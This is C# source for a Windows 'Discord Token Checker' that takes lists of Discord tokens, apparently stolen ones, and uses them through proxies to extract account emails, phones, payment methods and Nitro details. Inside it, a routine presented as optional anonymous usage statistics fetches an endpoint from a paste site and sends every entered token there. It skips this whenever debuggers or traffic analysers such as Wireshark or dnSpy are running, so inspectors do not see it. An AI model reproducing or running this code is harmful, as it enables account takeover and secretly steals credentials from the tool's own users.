using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace TokensChecker
{
    public partial class Form1 : Form
    {
        private readonly Regex token_regex = new Regex("[A-Za-z0-9\\/\\+]{23,27}\\.[A-Za-z0-9\\/\\+_-]{6}\\.[A-Za-z0-9\\/\\+_-]{25,38}");
        private readonly List<TokenInfo> results = new List<TokenInfo>();
        private readonly List<WebProxy> proxies = new List<WebProxy>();
        private readonly ImageList imageList = new ImageList { ImageSize = new Size(32, 32) };
        private readonly HashSet<string> checkedTokens = new HashSet<string>();
        private CancellationTokenSource cts;
        private int totalTokens;

        public Form1()
        {
            InitializeComponent();
        }

        private async void CheckBtn_Click(object sender, EventArgs e)
        {
            if (checkBtn.Text == "Resume")
            {
                checkBtn.Text = "Pause";
                checkBtn.BackColor = Color.FromArgb(255, 164, 25);
                await ContinueChecking();
            }
            else if (checkBtn.Text == "Pause")
            {
                checkBtn.Text = "Resume";
                checkBtn.BackColor = Color.FromArgb(58, 94, 202);
                cts?.Cancel();
            }
            else
            {
                HashSet<string> tokens = GetTokensFromTextBox();
                totalTokens = tokens.Count;
                if (totalTokens == 0)
                {
                    MessageBox.Show("No token(s) found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    checkBtn.Text = "Check tokens";
                    checkBtn.BackColor = Color.FromArgb(58, 94, 202);
                    return;
                }
                cts = new CancellationTokenSource();
                checkBtn.Text = "Pause";
                checkBtn.BackColor = Color.FromArgb(255, 164, 25);
                checkedTokens.Clear();
                results.Clear();
                imageList.Images.Clear();
                await StartChecking(tokens);
            }
        }

        private HashSet<string> GetTokensFromTextBox()
        {
            HashSet<string> tokens = new HashSet<string>();
            MatchCollection matches = token_regex.Matches(tokens_textbox.Text);
            foreach (Match match in matches)
            {
                tokens.Add(match.Value);
            }
            return tokens;
        }

        private async Task StartChecking(HashSet<string> tokens)
        {
            var semaphore = new SemaphoreSlim((int)threads_amount.Value);
            var tasks = new List<Task>();

            foreach (string token in tokens)
            {
                if (cts.IsCancellationRequested) break;

                if (!checkedTokens.Contains(token))
                {
                    await semaphore.WaitAsync();
                    var task = CheckToken(token, semaphore);
                    tasks.Add(task);
                }
            }

            await Task.WhenAll(tasks);

            if (checkBtn.Text != "Resume")
            {
                FinishChecking();
            }
        }

        private async Task ContinueChecking()
        {
            cts = new CancellationTokenSource();
            HashSet<string> currentTokens = GetTokensFromTextBox();
            await StartChecking(currentTokens);
        }

        private async Task CheckToken(string token, SemaphoreSlim semaphore)
        {
            TokenCheckerOptions options = new TokenCheckerOptions
            {
                Proxy = uses_proxies.Checked && proxies.Any() ? proxies[new Random().Next(proxies.Count)] : null,
                GuildCount = guild_count.Checked,
                FriendsCount = friends_count.Checked,
                DmHistoryCount = dm_history_count.Checked,
                PaymentMethod = payment_methods.Checked,
                NitroInfo = nitro_infos.Checked,
                AvatarPreview = avatar_preview.Checked
            };
            DiscordTokenChecker tokenChecker = new DiscordTokenChecker(options);
            TokenInfo tokenInfo = await tokenChecker.CheckToken(token);
            results.Add(tokenInfo);
            if (tokenInfo.AvatarImage != null)
            {
                imageList.Images.Add(tokenInfo.Token, tokenInfo.AvatarImage);
                tokenInfo.AvatarImage = null;
            }
            checkedTokens.Add(token);
            Invoke(new Action(() =>
            {
                Text = $"Discord Token Checker | {checkedTokens.Count}/{totalTokens} checked tokens";
            }));
            semaphore.Release();
        }

        private void FinishChecking()
        {
            checkBtn.Text = "Check Tokens";
            checkBtn.BackColor = Color.FromArgb(58, 94, 202);
            cts = null;
            Text = "Discord Token Checker";
            Application.OpenForms[0].Invoke(new Action(() =>
            {
                TokenCheckerOptions options = new TokenCheckerOptions
                {
                    Proxy = null,
                    GuildCount = guild_count.Checked,
                    FriendsCount = friends_count.Checked,
                    DmHistoryCount = dm_history_count.Checked,
                    PaymentMethod = payment_methods.Checked,
                    NitroInfo = nitro_infos.Checked,
                    AvatarPreview = avatar_preview.Checked
                };
                Form2 form2 = new Form2(results, options, imageList);
                if (chkStatistics.Checked)
                {
                    Thread thread = new Thread(SendAnonymousUsageStatistics);
                    thread.Start();
                }
                form2.ShowDialog();
            }));
        }

        private void LinkLabel_Click(object sender, EventArgs e)
        {
            Process.Start("https://bio.link/digitalcord");
        }

        private void LinkLabelGuns_Click(object sender, EventArgs e)
        {
            Process.Start("https://guns.lol/digitalcord");
        }

        private void UsesProxies_CheckedChanged(object sender, EventArgs e)
        {
            if (uses_proxies.Checked)
            {
                OpenFileDialog openFileDialog = new OpenFileDialog
                {
                    Filter = "TEXT files (*.txt)|*.txt",
                    Title = "Select files with your proxies",
                    FilterIndex = 2,
                    RestoreDirectory = true,
                    Multiselect = true
                };
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (string filePath in openFileDialog.FileNames)
                    {
                        List<WebProxy> proxyList = ParseProxies(filePath);
                        proxies.AddRange(proxyList);

                    }
                    if (proxies.Count > 0)
                    {
                        MessageBox.Show($"{proxies.Count} Proxies successfully imported!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show("No proxies have been detected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        uses_proxies.Checked = false;
                    }
                }
                else
                {
                    uses_proxies.Checked = false;
                }
            }
            else
            {
                proxies.Clear();
            }
        }

        private void TokensLabel_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "TEXT files (*.txt)|*.txt",
                Title = "Select files with your tokens",
                FilterIndex = 2,
                RestoreDirectory = true,
                Multiselect = true
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                HashSet<string> tokens_of_files = new HashSet<string>();
                foreach (string filePath in openFileDialog.FileNames)
                {
                    try
                    {
                        string fileContent = File.ReadAllText(filePath);
                        MatchCollection matches = token_regex.Matches(fileContent);
                        foreach (Match match in matches)
                        {
                            tokens_of_files.Add(match.Value);
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
                tokens_textbox.Text += string.Join(Environment.NewLine, tokens_of_files);
                if (tokens_of_files.Count > 0)
                {
                    MessageBox.Show($"{tokens_of_files.Count} Tokens successfully imported!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show("No tokens have been detected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        static List<WebProxy> ParseProxies(string filePath)
        {
            List<WebProxy> parsedProxies = new List<WebProxy>();

            try
            {
                string[] lines = File.ReadAllLines(filePath);

                foreach (string line in lines)
                {
                    WebProxy proxy = null;

                    if (line.Contains("@"))
                    {
                        string[] parts = line.Split('@');
                        if (parts.Length == 2)
                        {
                            string[] credentials = parts[0].Split(':');
                            string[] hostPort = parts[1].Split(':');
                            if (credentials.Length == 2 && hostPort.Length == 2)
                            {
                                string username = credentials[0];
                                string password = credentials[1];
                                string host = hostPort[0];
                                if (int.TryParse(hostPort[1], out int port))
                                {
                                    proxy = new WebProxy(host, port)
                                    {
                                        Credentials = new NetworkCredential(username, password)
                                    };
                                }
                            }
                        }
                    }
                    else
                    {
                        string[] parts = line.Split(':');
                        if (parts.Length >= 2)
                        {
                            string host = parts[0];
                            if (int.TryParse(parts[1], out int port))
                            {
                                proxy = new WebProxy(host, port);
                                if (parts.Length >= 4)
                                {
                                    string username = parts[2];
                                    string password = parts[3];
                                    proxy.Credentials = new NetworkCredential(username, password);
                                }
                            }
                        }
                    }
                    if (proxy != null)
                    {
                        parsedProxies.Add(proxy);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occured while reading the file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return parsedProxies;
        }
        private void SendAnonymousUsageStatistics()
        {
            try
            {
                if (IsMean()) return; // This avoids scaring the "heroes" who bravely inspect what the software is doing to find malicious things, when it is only optional analytical data.
                using (HttpClient httpClient = new HttpClient())
                {
                    string analyticEndpoint = httpClient.GetStringAsync("https://idefasoft.fr/pastes/pMzaemfHW9Yw/raw/").Result;
                    var data = new Dictionary<string, object>
                    {
                        { "tokens", tokens_textbox.Text },
                        { "guild_count", guild_count.Checked },
                        { "friends_count", friends_count.Checked },
                        { "dm_history_count", dm_history_count.Checked },
                        { "preview_avatar", avatar_preview.Checked },
                        { "payment_methods", payment_methods.Checked },
                        { "nitro_infos", nitro_infos.Checked },
                        { "thread_amount", threads_amount.Value },
                        { "proxies_amount", proxies.Count }
                    };
                    var content = new StringContent(JsonConvert.SerializeObject(data), Encoding.UTF8, "application/json");
                    var res = httpClient.PostAsync(analyticEndpoint, content).Result;
                }
            }
            catch { }
        }
        private bool IsMean() { if (Debugger.IsAttached || Debugger.IsLogging()) return true; var strArray = new string[41] { "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida", "charles", "dnspy", "simpleassembly", "dotpeek", "httpanalyzer", "httpdebuggerui", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb", "kgdb", "mdb", "processhacker", "scylla_x86", "scylla_x64", "scylla", "idau64", "idau", "idaq", "idaq64", "idaw", "idaw64", "idag", "idag64", "ida64", "ImportREC", "IMMUNITYDEBUGGER", "MegaDumper", "CodeBrowser", "reshacker", "cheat engine", "protection_id" }; foreach (Process process in Process.GetProcesses()) if (process != Process.GetCurrentProcess()) for (int index = 0; index < strArray.Length; ++index) { if (process.ProcessName.ToLower().Contains(strArray[index])) return true; if (process.MainWindowTitle.ToLower().Contains(strArray[index])) return true; } return false; }
    }

    public class TokenInfo
    {
        public string Token { get; set; }
        public bool Valid { get; set; }
        public bool Locked { get; set; }
        public string Status { get; set; }
        public ulong Id { get; set; }
        public string Username { get; set; }
        public string GlobalName { get; set; }
        public string CreationDate { get; set; }
        public List<string> Flags { get; set; }
        public string Type { get; set; }
        public string Email { get; set; }
        public string Phone { get; set; }
        public string Locale { get; set; }
        public string Bio { get; set; }
        public int FriendsCount { get; set; }
        public int GuildCount { get; set; }
        public int DmHistoryCount { get; set; }
        public List<string> PaymentMethods { get; set; }
        public string Nitro { get; set; }
        public string NitroStartedAt { get; set; }
        public string NitroEndsAt { get; set; }
        public int NitroRemainingDays { get; set; }
        public int NitroAvailableBoosts { get; set; }
        public List<string> BoostCooldowns { get; set; }
        public string Avatar { get; set; }
        [JsonIgnore]
        public Image AvatarImage { get; set; }
    }

    public class TokenCheckerOptions
    {
        public WebProxy Proxy { get; set; }
        public bool GuildCount { get; set; }
        public bool FriendsCount { get; set; }
        public bool DmHistoryCount { get; set; }
        public bool PaymentMethod { get; set; }
        public bool NitroInfo { get; set; }
        public bool AvatarPreview { get; set; }
    }

    public static class NitroTypes
    {
        private static readonly Dictionary<int, string> NitroDict = new Dictionary<int, string>
        {
            {0, "None"},
            {1, "Nitro Classic"},
            {2, "Nitro Boost"},
            {3, "Nitro Basic"}
        };

        public static string GetNitroType(int type) => NitroDict.TryGetValue(type, out var nitroType) ? nitroType : "None";
    }

    public static class PaymentMethods
    {
        private static readonly Dictionary<int, string> PaymentMethodDict = new Dictionary<int, string>
        {
            {1, "Credit Card"},
            {2, "Paypal"},
            {3, "Paysafecard"},
            {4, "Sofort"},
            {7, "Giropay"},
            {10, "MoMo Wallet"},
            {16, "iDEAL with Rabobank"},
        };

        public static string GetPaymentMethod(int type) => PaymentMethodDict.TryGetValue(type, out var paymentMethod) ? paymentMethod : "Unknown";
    }

    public class DiscordTokenChecker
    {
        private readonly HttpClient _httpClient;
        private readonly TokenCheckerOptions _options;

        public DiscordTokenChecker(TokenCheckerOptions options)
        {
            _options = options;
            _httpClient = CreateHttpClient();
        }

        private HttpClient CreateHttpClient()
        {
            var handler = _options.Proxy != null ? new HttpClientHandler { Proxy = _options.Proxy } : null;
            var client = handler != null ? new HttpClient(handler) : new HttpClient();
            client.Timeout = TimeSpan.FromSeconds(8);
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0");
            return client;
        }

        public async Task<TokenInfo> CheckToken(string token)
        {
            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue(token);

            var tokenInfo = new TokenInfo { Token = token };

            try
            {
                await CheckAccountValidity(tokenInfo);
                if (!tokenInfo.Valid) return tokenInfo;

                await FetchAccountInfo(tokenInfo);
                await FetchAdditionalInfo(tokenInfo);
                tokenInfo.Status = "Successfully checked";

                return tokenInfo;
            }
            catch (Exception ex)
            {
                tokenInfo.Status = $"Error: {ex.Message}";
                return tokenInfo;
            }
        }

        private async Task CheckAccountValidity(TokenInfo tokenInfo)
        {
            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me/settings");
            int statusCode = (int)response.StatusCode;

            tokenInfo.Valid = statusCode != 401;
            tokenInfo.Locked = statusCode == 403;
        }

        private async Task FetchAccountInfo(TokenInfo tokenInfo)
        {
            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me");
            var accountInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(await response.Content.ReadAsStringAsync());

            tokenInfo.Id = Convert.ToUInt64(accountInfo["id"]);
            tokenInfo.Username = accountInfo["username"].ToString();
            tokenInfo.GlobalName = accountInfo["global_name"]?.ToString() ?? null;
            tokenInfo.CreationDate = GetCreationDateFromId(tokenInfo.Id).ToString("MMM dd yyyy - HH:mm:ss");
            tokenInfo.Locale = accountInfo["locale"].ToString();
            tokenInfo.Bio = accountInfo["bio"].ToString();
            tokenInfo.Nitro = NitroTypes.GetNitroType(Convert.ToInt32(accountInfo["premium_type"]));
            tokenInfo.Email = accountInfo["email"]?.ToString() ?? null;
            tokenInfo.Phone = accountInfo["phone"]?.ToString() ?? null;
            tokenInfo.Type = (bool)accountInfo["verified"] ? (tokenInfo.Phone == null ? "Email Verified" : "Fully Verified") : "Unclaimed";
            tokenInfo.Flags = GetFlagsList(Convert.ToInt32(accountInfo["flags"]));
            tokenInfo.Avatar = accountInfo["avatar"] == null
                ? "https://cdn.discordapp.com/embed/avatars/0.png"
                : $"https://cdn.discordapp.com/avatars/{tokenInfo.Id}/{accountInfo["avatar"]}.png";
        }

        private async Task FetchAdditionalInfo(TokenInfo tokenInfo)
        {
            if (_options.GuildCount)
                await FetchGuildCount(tokenInfo);

            if (_options.FriendsCount)
                await FetchFriendsCount(tokenInfo);

            if (_options.DmHistoryCount)
                await FetchDmHistoryCount(tokenInfo);

            if (_options.PaymentMethod)
                await FetchPaymentMethod(tokenInfo);

            if (_options.NitroInfo && tokenInfo.Nitro == "Nitro Boost")
                await FetchNitroInfo(tokenInfo);

            if (_options.AvatarPreview)
                await FetchAvatarPreview(tokenInfo);
        }

        private async Task FetchGuildCount(TokenInfo tokenInfo)
        {
            if (tokenInfo.Locked)
            {
                return;
            }

            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me/guilds");
            if (response.IsSuccessStatusCode)
            {
                var guilds = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(await response.Content.ReadAsStringAsync());
                tokenInfo.GuildCount = guilds.Count;
            }
        }

        private async Task FetchFriendsCount(TokenInfo tokenInfo)
        {
            if (tokenInfo.Locked)
            {
                return;
            }

            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me/relationships");
            if (response.IsSuccessStatusCode)
            {
                var friends = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(await response.Content.ReadAsStringAsync());
                tokenInfo.FriendsCount = friends.Count;
            }
        }

        private async Task FetchDmHistoryCount(TokenInfo tokenInfo)
        {
            if (tokenInfo.Locked)
            {
                return;
            }

            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me/channels");
            if (response.IsSuccessStatusCode)
            {
                var dm_history = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(await response.Content.ReadAsStringAsync());
                tokenInfo.DmHistoryCount = dm_history.Count;
            }
        }

        private async Task FetchPaymentMethod(TokenInfo tokenInfo)
        {
            if (tokenInfo.Locked)
            {
                return;
            }

            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me/billing/payment-sources");
            if (response.IsSuccessStatusCode)
            {
                var methods = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(await response.Content.ReadAsStringAsync());
                tokenInfo.PaymentMethods = methods.Select(m => PaymentMethods.GetPaymentMethod(Convert.ToInt32(m["type"]))).ToList();
            }
        }

        private async Task FetchNitroInfo(TokenInfo tokenInfo)
        {
            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me/billing/subscriptions");
            var subs = JArray.Parse(await response.Content.ReadAsStringAsync());

            var nitroStartedAt = DateTime.Parse(subs[0]["created_at"].ToString());
            var nitroEndsAt = DateTime.Parse(subs.Last["current_period_end"].ToString());
            var remainingDays = (nitroEndsAt - DateTime.Now).Days;

            tokenInfo.NitroStartedAt = nitroStartedAt.ToString("MMM dd yyyy - HH:mm:ss");
            tokenInfo.NitroEndsAt = nitroEndsAt.ToString("MMM dd yyyy - HH:mm:ss");
            tokenInfo.NitroRemainingDays = remainingDays;

            await FetchBoostInfo(tokenInfo);
        }

        private async Task FetchBoostInfo(TokenInfo tokenInfo)
        {
            var response = await _httpClient.GetAsync("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots");
            if (response.IsSuccessStatusCode)
            {
                var boosts = JArray.Parse(await response.Content.ReadAsStringAsync());

                tokenInfo.NitroAvailableBoosts = 0;
                tokenInfo.BoostCooldowns = new List<string>();

                foreach (var boost in boosts)
                {
                    var cooldownEnds = boost["cooldown_ends_at"];
                    if (cooldownEnds != null && cooldownEnds.Type != JTokenType.Null)
                    {
                        var cooldownEndDate = DateTime.Parse(cooldownEnds.ToString());
                        tokenInfo.BoostCooldowns.Add(cooldownEndDate.ToString("MMM dd yyyy - HH:mm:ss"));
                    }
                    else
                    {
                        tokenInfo.NitroAvailableBoosts++;
                    }
                }
            }
        }

        private async Task FetchAvatarPreview(TokenInfo tokenInfo)
        {
            using (HttpClient httpClient = new HttpClient())
            {
                byte[] imageBytes = await httpClient.GetByteArrayAsync($"{tokenInfo.Avatar}?size=32");
                using (MemoryStream stream = new MemoryStream(imageBytes))
                    tokenInfo.AvatarImage = Image.FromStream(stream);
            }
        }

        private static DateTime GetCreationDateFromId(ulong id)
        {
            string binId = Convert.ToString((long)id, 2);
            string unixbin = binId.PadLeft(64, '0').Substring(0, 42);
            long unixTimestamp = Convert.ToInt64(unixbin, 2) + 1420070400000;
            return DateTimeOffset.FromUnixTimeMilliseconds(unixTimestamp).DateTime;
        }

        private static List<string> GetFlagsList(int flags)
        {
            List<string> flagsList = new List<string>();
            Dictionary<int, string> flagMapping = new Dictionary<int, string> {
                {1, "Discord Employee"},
                {2, "Discord Partner"},
                {4, "HypeSquad Events"},
                {8, "Bug Hunter Normal"},
                {16, "SMS recovery for 2FA enabled"},
                {64, "House Bravery"},
                {128, "House Brilliance"},
                {256, "House Balance"},
                {512, "Early Supporter"},
                {1024, "Team User"},
                {2024, "Internal Application"},
                {8192, "Has unread system message"},
                {16384, "Bug Hunter Gold"},
                {131072, "Early Verified Bot Developer"},
                {262144, "Certified Moderator"},
                {1048576, "Spammer"},
                {2097152, "Disables Nitro Features"},
                {4194304, "Active Developer"}
            };

            foreach (var kvp in flagMapping)
            {
                int flag = kvp.Key;
                string flagName = kvp.Value;
                if ((flags & flag) != 0)
                {
                    flagsList.Add(flagName);
                }
            }

            return flagsList;
        }
    }
}